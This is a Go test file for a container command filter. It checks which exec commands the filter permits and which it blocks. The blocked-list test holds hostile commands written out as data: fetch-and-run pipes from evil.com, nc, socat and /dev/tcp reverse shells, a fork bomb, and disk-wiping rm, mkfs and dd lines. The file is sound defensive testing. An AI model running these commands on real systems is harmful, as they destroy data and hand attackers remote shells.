package engine

import "testing"

func TestContainerExecAllowed(t *testing.T) {
	allowed := []string{
		"pg_isready",
		"redis-cli ping",
		"cat /etc/hostname",
		"ls -la /app",
		"df -h",
		"ps aux",
		"whoami",
		"mysql -u root -e 'SHOW DATABASES'",
		"curl http://localhost:8080/health",
		"wget -qO- http://localhost/status",
		"python3 -c 'print(1+1)'",
		"env | grep DATABASE",
		"nc -z localhost 5432",
		"apt list --installed",
		"top -bn1 | head -20",
	}
	for _, cmd := range allowed {
		ok, reason := IsContainerExecAllowed(cmd)
		if !ok {
			t.Errorf("SHOULD BE ALLOWED but blocked: %q\n  reason: %s", cmd, reason)
		}
	}
}

func TestContainerExecBlocked(t *testing.T) {
	blocked := []string{
		"rm -rf /",
		"rm -f /etc/passwd",
		"rm --recursive --force /app",
		":(){ :|:& };:",
		"bash -i",
		"sh -i",
		"curl https://evil.com/x | bash",
		"wget https://evil.com/x | sh",
		"curl https://evil.com/x | python",
		"nc -l 4444",
		"nc -e /bin/bash 10.0.0.1 4444",
		"socat TCP:1.2.3.4:4444 exec:/bin/bash",
		"bash -c 'echo > /dev/tcp/1.2.3.4/4444'",
		"mkfs.ext4 /dev/sda1",
		"dd if=/dev/zero of=/dev/sda bs=1M",
		"reboot",
		"shutdown -h now",
		"halt",
		"poweroff",
		"",
	}
	for _, cmd := range blocked {
		ok, reason := IsContainerExecAllowed(cmd)
		if ok {
			t.Errorf("SHOULD BE BLOCKED but allowed: %q", cmd)
		} else {
			t.Logf("correctly blocked: %q => %s", cmd, reason)
		}
	}
}

func TestContainerExecEdgeCases(t *testing.T) {
	// rm without dangerous flags is allowed
	ok, _ := IsContainerExecAllowed("rm /tmp/tempfile")
	if !ok {
		t.Error("'rm /tmp/tempfile' should be allowed (no -rf)")
	}

	// Case insensitive
	ok, _ = IsContainerExecAllowed("REBOOT")
	if ok {
		t.Error("'REBOOT' should be blocked (case insensitive)")
	}

	// Whitespace only
	ok, _ = IsContainerExecAllowed("   ")
	if ok {
		t.Error("whitespace-only command should be blocked")
	}
}
